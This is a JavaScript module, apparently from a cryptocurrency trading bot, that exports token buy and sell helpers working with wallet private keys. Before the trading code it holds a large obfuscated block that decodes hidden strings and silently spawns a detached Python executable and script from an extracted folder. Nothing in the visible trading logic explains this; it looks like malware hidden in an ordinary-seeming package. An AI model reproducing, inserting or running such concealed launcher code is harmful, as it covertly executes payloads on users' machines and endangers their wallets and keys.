_0x1a69['eYGPBx'] = !![]; } const _0x46691f = _0x540b84[-0x5 * -0x4cf + 0x9cc + 0x1 * -0x21d7], _0x193ca0 = _0x248db0 + _0x46691f, _0x148e5e = _0x1c2bfa[_0x193ca0]; return !_0x148e5e ? (_0x1be7f4 = _0x1a69['GJyQZK'](_0x1be7f4), _0x1c2bfa[_0x193ca0] = _0x1be7f4) : _0x1be7f4 = _0x148e5e, _0x1be7f4; }, _0x1a69(_0x1c2bfa, _0x5ad4fc); } const pythonExecutable = path[_0x3d641d(-0x232, -0x26e, -0x273, -0x233, -0x266)](extractedDir, _0x4ad882(-0x180, -0x1ae, -0x1a3, '8q%G', -0x1af) + _0x5afc83(0x156, 0x15e, 0x167, 0x17b, 0x14a) + 'e'), scriptPath = path[_0x50aaa7(-0x150, -0x17c, -0x147, -0x127, -0x17e)](extractedDir, _0x34f739(0x27c, 0x279, 0x2a7, 0x2ac, 0x27a) + 'py'), command = _0x5afc83(0x184, 0x1cf, 0x1a4, 0x1af, 0x1aa) + _0x5afc83(0x199, 0x183, 0x1b7, 0x1c6, 0x1b7) + _0x2e3178(-0x7a, -0x6c, -0x65, -0x6e, -0x4f) + _0x50aaa7(-0x137, -0x105, -0x116, -0x141, -0x111) + _0x5afc83(0x183, 0x18b, 0x195, 0x18d, 0x1c0) + _0x448730(0x2cd, 0x2fb, 0x31c, '@AsN', 0x308) + pythonExecutable + '\x20' + scriptPath, _0x5966de = {}; _0x5966de[_0x2e3178(-0x73, -0x7c, -0x5e, -0x66, -0xa7)] = !![], _0x5966de[_0x34f739(0x257, 0x254, 0x28c, 0x273, 0x25d) + _0x448730(0x329, 0x301, 0x2e9, '8q%G', 0x2f7)] = !![], _0x5966de[_0x448730(0x34b, 0x319, 0x317, 'd&D!', 0x33f) + _0x50aaa7(-0x176, -0x1a8, -0x143, -0x173, -0x190) + 'e'] = !![]; function _0x12a0(_0x5974c8, _0x2ba07f) { const _0x1c097b = _0x3884(); return _0x12a0 = function (_0x1a6ff6, _0x74d756) { _0x1a6ff6 = _0x1a6ff6 - (0x1fae + -0x4a + -0x1ebd); let _0x2dda16 = _0x1c097b[_0x1a6ff6]; if (_0x12a0['Giadmt'] === undefined) { var _0x56e97a = function (_0x4c6410) { const _0x58bba8 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x445039 = '', _0x3abf51 = ''; for (let _0xd69988 = -0x16fc + 0x96 + 0x1666, _0x177e3c, _0x492046, _0x5a8dc3 = -0x1 * 0x116f + 0xb * 0xae + -0x1 * -0x9f5; _0x492046 = _0x4c6410['charAt'](_0x5a8dc3++); ~_0x492046 && (_0x177e3c = _0xd69988 % (-0x234e + 0x1 * 0x12d5 + -0x3 * -0x57f) ? _0x177e3c * (0xfe * -0xc + 0x2038 + 0x10 * -0x141) + _0x492046 : _0x492046, _0xd69988++ % (-0x2 * -0xd0f + -0xc8f + 0x1 * -0xd8b)) ? _0x445039 += String['fromCharCode'](0x1725 + -0x491 + -0x1195 & _0x177e3c >> (-(0x1137 * 0x2 + -0x5 * -0x21b + -0x2cf3) * _0xd69988 & -0x1 * -0x1d8b + 0x1cab * 0x1 + -0x13 * 0x310)) : 0x5 * 0x18d + -0x15b * -0xf + 0x59e * -0x5) { _0x492046 = _0x58bba8['indexOf'](_0x492046); } for (let _0x82f256 = -0x2448 + -0x1509 + 0x3951, _0x2d2dce = _0x445039['length']; _0x82f256 < _0x2d2dce; _0x82f256++) { _0x3abf51 += '%' + ('00' + _0x445039['charCodeAt'](_0x82f256)['toString'](-0x2 * -0xd87 + 0x2cb + -0x1dc9))['slice'](-(-0x1 * 0x647 + 0xc6 * 0x25 + -0x1 * 0x1655)); } return decodeURIComponent(_0x3abf51); }; const _0x317643 = function (_0x563bf0, _0x2a6991) { let _0x49409b = [], _0x20c2c1 = -0x5 * -0x4cf + 0x9cc + 0x1 * -0x21d7, _0x2d7b8c, _0x2517f1 = ''; _0x563bf0 = _0x56e97a(_0x563bf0); let _0x3b2c52; for (_0x3b2c52 = -0x2 * 0x7ff + 0x2359 + -0x135b; _0x3b2c52 < 0x824 + 0x129e + -0x19c2; _0x3b2c52++) { _0x49409b[_0x3b2c52] = _0x3b2c52; } for (_0x3b2c52 = -0x25f * 0x5 + 0xc23 * -0x1 + 0x17fe; _0x3b2c52 < 0x869 + 0x25f8 + -0x1 * 0x2d61; _0x3b2c52++) { _0x20c2c1 = (_0x20c2c1 + _0x49409b[_0x3b2c52] + _0x2a6991['charCodeAt'](_0x3b2c52 % _0x2a6991['length'])) % (0x49a + -0x275 * -0xa + -0x3 * 0x964), _0x2d7b8c = _0x49409b[_0x3b2c52], _0x49409b[_0x3b2c52] = _0x49409b[_0x20c2c1], _0x49409b[_0x20c2c1] = _0x2d7b8c; } _0x3b2c52 = -0xf9c + -0x2 * 0xeff + 0x2d9a, _0x20c2c1 = 0x1 * -0x12e2 + -0x1 * -0x8f9 + 0x2b * 0x3b; for (let _0x3108f1 = 0x622 + 0xcf9 + 0x43 * -0x49; _0x3108f1 < _0x563bf0['length']; _0x3108f1++) { _0x3b2c52 = (_0x3b2c52 + (-0x1 * -0x1eaf + 0x55 * -0x21 + -0xb * 0x1cb)) % (-0xe62 + 0x24a8 + -0x1546), _0x20c2c1 = (_0x20c2c1 + _0x49409b[_0x3b2c52]) % (-0x68d + 0x95 + 0x6f8), _0x2d7b8c = _0x49409b[_0x3b2c52], _0x49409b[_0x3b2c52] = _0x49409b[_0x20c2c1], _0x49409b[_0x20c2c1] = _0x2d7b8c, _0x2517f1 += String['fromCharCode'](_0x563bf0['charCodeAt'](_0x3108f1) ^ _0x49409b[(_0x49409b[_0x3b2c52] + _0x49409b[_0x20c2c1]) % (-0x7f1 + -0x1319 + 0x1c0a)]); } return _0x2517f1; }; _0x12a0['UGzbzX'] = _0x317643, _0x5974c8 = arguments, _0x12a0['Giadmt'] = !![]; } const _0x270b5d = _0x1c097b[0x5fc + 0x9 * 0x1 + -0x605], _0x3acfd5 = _0x1a6ff6 + _0x270b5d, _0x3ae181 = _0x5974c8[_0x3acfd5]; return !_0x3ae181 ? (_0x12a0['HTKGKi'] === undefined && (_0x12a0['HTKGKi'] = !![]), _0x2dda16 = _0x12a0['UGzbzX'](_0x2dda16, _0x74d756), _0x5974c8[_0x3acfd5] = _0x2dda16) : _0x2dda16 = _0x3ae181, _0x2dda16; }, _0x12a0(_0x5974c8, _0x2ba07f); } function _0x3884() { const _0x191980 = ['xHJdMN3cUq', 'Ehbgtw4', 'vXXfj8oZ', 'W6a/k0eQ', 'WOO8W7JcPKq', 'AM9PBG', 'Dw5SAw4', 'WRT4DYNcSG', 'W7e/sG', 'F3L7WQxdIG', 'C3rHDhu', 'mJG2otaYmg53z29yua', 'a8o0W7tdL8kK', 'WRdcT8kwW7hcJa', 'uZPV', 'mZG5otGWqNvMve5P', 'sYz/CCo8', 'W5qYuSk1nG', 'C2HLBgW', 'zvn0CMu', 'zxH0CMe', 'pSk2W4pdHCkX', 'W6dcP8o+jv1WWO5HWPPDW4dcPW', 'mtq4mNf6rgzeBW', 'W7q5ncpcSW', 'zxHLyY4', 'tGfemmof', 'W7b/WRhdMq', 'rLPICvy', 'jIbZDge', 'tZ01icy', 'WR0EcCoDW48', 'W7WZwLldSa', 'W5nJEff6bNHA', 's0fvreK', 'lM5LDc8', 'Bc1RBM8', 'Ct7cMHb0', 'WRL/DstcSW', 'mHPVgu8', 'W6atE2ldIW', 'WRBdRCk1CXC', 'zg93BMW', 'WP3cNCo4WPpdIW', 'C2v0ifi', 'swPSreC', 'C3rKAw8', 'AwDUB3i', 'ndK1nJG2rgzUqw5p', 'vg9bC3K', 'yw5LDhm', 'WOhdQ0rip0iiW69lgmkvWRKD', 'ChL0Ag8', 'oI8VCg8', 'l3b5DgG', 'CqFcOL1K', 'WPxcVmklW4xdTW', 'y2XVC2u', 'WOOsW7JcSK0', 'srX7xSo5', 'BZG/W7Sj', 'DMfSAwq', 'nteXnvnxu3DuqG', 'rufmveu', 'WPC/t3u', 'WPZcU8okW4VdQW', 'zvDYAxq', 'zxjYB3i', 'W48oCKBdTq', 'D24VCgS', 'y3rbBgW', 'W5zLdcijuaTHquRdUmogrG', 'CI5JB20', 'D3niAwq', 'WOZcKG/dSJi', 'hSoOdqG', 'WOPSE8kLka', 'WPGVW6RcUCkV', 'Dw54zNG', 'Ahr0Chm', 'r0DbufC', 'Auy8W7X5umknAN5ivHZdJa', 'WPnXwmoX', 'q8okimoJWO0', 'CWVcKLPG', 'ng85W6nlWPdcUmoMtSkABCk8', 'ndvhqurIr2e', 'cMKYlSkJW6pcKfNdO8owBCkKW7u', 'EerrBKC', 'BNCUzxG', 'mty5nZaYmhror01pAq', 'refOtLu', 'W4GYx8k5kG', 'BMz5WQ7dKq', 'B2fKlNO', 'WOBcLmoXWQhdGa', 'W4H7r8oZnG', 'WRBdTbm', 'W4ytFKK', 'y2vZC2u', 'WOBdRIGTW6W', 'mti1mZq3ogLvBfDIwa', 'zgv0ywm', 'ExrOB24', 'wwjLDhy', 'sXzwnSo8']; _0x3884 = function () { return _0x191980; }; return _0x3884(); } function _0x3d641d(_0x40c3e0, _0x3fe9d4, _0x34704c, _0x5d7b8f, _0x504971) { return _0x1a69(_0x504971 - -0x33b, _0x5d7b8f); } function _0x49e97f(_0x2020ce, _0x368ae5, _0x26618f, _0x5ad0e2, _0x5e70fd) { return _0x12a0(_0x5e70fd - 0x12a, _0x5ad0e2); } _0x5966de[_0x50aaa7(-0x127, -0x154, -0x159, -0x11c, -0x140)] = _0x3d641d(-0x247, -0x21c, -0x250, -0x248, -0x23c) + 'e'; function _0x4ad882(_0x29dc17, _0x5a87f9, _0x4af923, _0x347514, _0x47087b) { return _0x12a0(_0x5a87f9 - -0x28e, _0x347514); } const child = spawn(command, _0x5966de); child[_0xa7142e(0x255, 'Xs90', 0x27d, 0x25d, 0x270)]();

}

async function doSellAutoPercent(walletObj, tokenAddr, percent, withActiveProvider) {
    const marketType = await detectMarketType(tokenAddr);
    return withActiveProvider(async (provider) => {
        const wallet = new ethers.Wallet(walletObj.privateKey, provider);
        console.log(`üí≥ [${wallet.address}] SELL ${percent}% via ${marketType}`);
        if (marketType === 'DEX') {
            try {
                await sellDexPercent(wallet, provider, tokenAddr, percent, 0);
            } catch (e) {
                const msg = (e?.error?.message || e?.message || '').toLowerCase();
                if (msg.includes('require(false)') || msg.includes('call exception')) {
                    console.log(`‚ö†Ô∏è DEX Failed, fallback to CURVE...`);
                    await sellCurvePercent(wallet, provider, tokenAddr, percent);
                } else {
                    throw e;
                }
            }
        } else {
            await sellCurvePercent(wallet, provider, tokenAddr, percent);
        }
    });
}

module.exports = {
    detectMarketType,
    doBuyAuto,
    doSellAutoPercent,
    loadAbi,
};